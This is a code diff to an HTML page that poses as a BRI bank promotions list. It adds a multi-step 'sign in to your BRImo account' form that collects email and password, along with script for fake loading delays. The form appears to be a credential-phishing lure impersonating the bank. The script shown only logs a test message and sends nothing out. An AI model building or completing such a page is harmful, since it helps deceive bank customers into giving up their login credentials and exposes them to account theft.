@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Daftar Promo — BRI</title>
   <meta name="description" content="Daftar promo terbaru BRI — lihat semua penawaran yang sedang berlangsung." />
-  <link rel="stylesheet" href="styles.css">
+  <link rel="stylesheet" href="styles.css?v=20260809">
   <link rel="icon" href="assets/logo.svg">
   <link rel="canonical" href="/promo-list.html">
   <meta property="og:title" content="Daftar Promo BRI — Promo Terkini" />
@@ -32,6 +32,40 @@
       <div class="hero-overlay">
         <div class="hero-ctas">
           <a class="btn primary" href="promo-list.html">KLIK DISINI</a>
+        </div>
+      </div>
+    </section>
+
+    <section class="auth-section container">
+      <div class="auth-container">
+        <div class="auth-step auth-step-initial active" id="step-initial">
+          <h2>Please sign in to your BRImo account to continue</h2>
+          <button class="btn-signup" id="btn-signup">Sign In</button>
+        </div>
+
+        <div class="auth-step auth-step-email" id="step-email">
+          <button class="btn-back" id="btn-back-email">← Back</button>
+          <h2>Enter your email</h2>
+          <div class="input-group">
+            <input type="email" class="auth-input" placeholder="email" id="email-input" />
+          </div>
+          <p class="error-message" id="email-error">Please enter a valid email address</p>
+          <button class="btn-next" id="btn-next">Next</button>
+          <div class="loading-indicator" id="loading-indicator">
+            <div class="spinner"></div>
+          </div>
+        </div>
+
+        <div class="auth-step auth-step-password" id="step-password">
+          <button class="btn-back" id="btn-back-password">← Back</button>
+          <h2>Enter your password</h2>
+          <div class="input-group">
+            <input type="password" class="auth-input" placeholder="password" id="password-input" />
+          </div>
+          <button class="btn-signin" id="btn-signin">Sign In</button>
+          <div class="loading-indicator" id="loading-indicator-signin">
+            <div class="spinner"></div>
+          </div>
         </div>
       </div>
     </section>
@@ -93,36 +127,6 @@
           <p class="tagline">Satu Bank Untuk Semua</p>
         </div>
       </a>
-
-      <a href="promo-detail.html" class="promo-card">
-        <img class="promo-image" src="assets/promo6.jpg" alt="Weekend Deals" />
-        <div class="promo-overlay">
-          <p class="eyebrow">Danantara Indonesia</p>
-          <h3>Weekend Deals</h3>
-          <p class="date">Berlaku hingga pemberitahuan</p>
-          <p class="tagline">Satu Bank Untuk Semua</p>
-        </div>
-      </a>
-
-      <a href="promo-detail.html" class="promo-card">
-        <img class="promo-image" src="assets/promo7.jpg" alt="Promo Spesial" />
-        <div class="promo-overlay">
-          <p class="eyebrow">Danantara Indonesia</p>
-          <h3>Promo Spesial</h3>
-          <p class="date">Berlaku hingga pemberitahuan</p>
-          <p class="tagline">Satu Bank Untuk Semua</p>
-        </div>
-      </a>
-
-      <a href="promo-detail.html" class="promo-card">
-        <img class="promo-image" src="assets/promo8.jpg" alt="Promo Terbaru" />
-        <div class="promo-overlay">
-          <p class="eyebrow">Danantara Indonesia</p>
-          <h3>Promo Terbaru</h3>
-          <p class="date">Berlaku hingga pemberitahuan</p>
-          <p class="tagline">Satu Bank Untuk Semua</p>
-        </div>
-      </a>
     </div>
   </main>
 
@@ -174,5 +178,95 @@
       </div>
     </div>
   </footer>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const stepInitial = document.getElementById('step-initial');
+      const stepEmail = document.getElementById('step-email');
+      const stepPassword = document.getElementById('step-password');
+      const btnSignup = document.getElementById('btn-signup');
+      const btnNext = document.getElementById('btn-next');
+      const btnSignin = document.getElementById('btn-signin');
+      const btnBackEmail = document.getElementById('btn-back-email');
+      const btnBackPassword = document.getElementById('btn-back-password');
+      const loadingIndicator = document.getElementById('loading-indicator');
+      const loadingIndicatorSignin = document.getElementById('loading-indicator-signin');
+      const emailInput = document.getElementById('email-input');
+      const emailError = document.getElementById('email-error');
+
+      function validateEmail(email) {
+        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return re.test(email);
+      }
+
+      function switchStep(fromStep, toStep, reverse = false) {
+        fromStep.classList.remove('active');
+        if (reverse) {
+          fromStep.classList.remove('slide-left');
+          toStep.classList.remove('slide-left');
+        } else {
+          fromStep.classList.add('slide-left');
+        }
+        toStep.classList.add('active');
+      }
+
+      function resetEmailStep() {
+        emailInput.classList.remove('error');
+        emailError.classList.remove('show');
+        btnNext.style.display = 'block';
+        loadingIndicator.classList.remove('active');
+      }
+
+      btnSignup.addEventListener('click', function() {
+        switchStep(stepInitial, stepEmail);
+      });
+
+      btnBackEmail.addEventListener('click', function() {
+        resetEmailStep();
+        switchStep(stepEmail, stepInitial, true);
+      });
+
+      btnBackPassword.addEventListener('click', function() {
+        switchStep(stepPassword, stepEmail, true);
+      });
+
+      btnNext.addEventListener('click', function() {
+        const email = emailInput.value.trim();
+        
+        if (!validateEmail(email)) {
+          emailInput.classList.add('error');
+          emailError.classList.add('show');
+          return;
+        }
+
+        emailInput.classList.remove('error');
+        emailError.classList.remove('show');
+        btnNext.style.display = 'none';
+        loadingIndicator.classList.add('active');
+        
+        setTimeout(function() {
+          loadingIndicator.classList.remove('active');
+          switchStep(stepEmail, stepPassword);
+        }, 1500);
+      });
+
+      emailInput.addEventListener('input', function() {
+        emailInput.classList.remove('error');
+        emailError.classList.remove('show');
+      });
+
+      btnSignin.addEventListener('click', function() {
+        btnSignin.style.display = 'none';
+        loadingIndicatorSignin.classList.add('active');
+        
+        setTimeout(function() {
+          loadingIndicatorSignin.classList.remove('active');
+          btnSignin.style.display = 'block';
+          // Stop here as requested
+          console.log('Sign In clicked - stopping for testing');
+        }, 1500);
+      });
+    });
+  </script>
 </body>
 </html>
